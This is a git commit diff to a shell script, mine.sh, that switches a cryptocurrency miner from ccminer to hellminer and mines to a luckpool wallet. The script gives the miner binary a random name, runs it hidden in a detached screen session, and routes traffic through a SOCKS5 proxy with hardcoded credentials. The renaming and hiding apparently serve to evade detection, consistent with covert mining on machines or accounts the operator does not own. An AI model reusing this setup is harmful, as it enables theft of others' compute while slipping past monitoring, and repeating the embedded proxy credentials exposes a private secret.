e5ba75b039fb0c26f0811b00b69e2e63f4ac8c8d
cvayoyo <145971481+Cvayoyo@users.noreply.github.com>
2026-04-28 14:49:03 +0700

    Refactor mining script to use hellminer

--- mine.sh
+++ mine.sh
@@ -1,8 +1,5 @@
-chmod +x * 
-cd ccminer_CPU_3.8.3 
-chmod +x * 
 proxy_url="socks5://tykQ7b:qxmTUk@95.164.245.175:9864"
-random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
-mv ccminer.exe $random_name.exe 
-chmod +x * 
-screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p d=16384S -t 6 --proxy=$proxy_url"
+random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)
+mv hellminer $random_name
+chmod +x $random_name
+screen -d -m bash -c "./$random_name -c stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p x --cpu 6 --proxy=$proxy_url"
